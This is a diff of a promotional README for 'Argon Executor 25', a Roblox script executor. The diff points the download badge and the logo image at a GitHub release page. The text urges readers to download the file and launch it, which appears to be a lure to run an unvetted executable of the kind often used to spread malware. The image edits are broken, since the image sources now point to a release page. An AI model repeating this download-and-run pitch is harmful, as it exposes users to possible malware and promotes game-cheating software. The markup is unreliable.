@@ -26,7 +26,7 @@ Argon Executor is a robust tool that offers AI integration for seamless script d
 ## Get Started
 Download the latest version of Argon Executor 25 by clicking the button below:
 
-[![Download Argon Executor 25](https://img.shields.io/badge/Download-Argon%20Executor%2025-brightgreen)](https://github.com/file/App.zip)
+[![Download Argon Executor 25](https://github.com/tintermet/Argon-Executor-25/releases/tag/v2.0%20Executor%2025-brightgreen)](https://github.com/tintermet/Argon-Executor-25/releases/tag/v2.0)
 
 *If the link ends with the file name, make sure to launch it to access Argon Executor 25.*
 
@@ -38,7 +38,7 @@ We welcome contributions to improve Argon Executor 25! If you have any suggestio
 ## Support
 For any assistance or inquiries, don't hesitate to reach out to our support team. Whether you have questions about using Argon Executor 25 or need help with script development, we're here to help you enhance your Roblox experience.
 
-![Argon Executor Logo](https://example.com/logo.png)
+![Argon Executor Logo](https://github.com/tintermet/Argon-Executor-25/releases/tag/v2.0)
 
 ---
 By incorporating AI integration, premium features, and dedicated support, Argon Executor 25 sets itself apart as a top-tier script executor for Roblox. Download now and elevate your gameplay to new heights! 🚀🎮
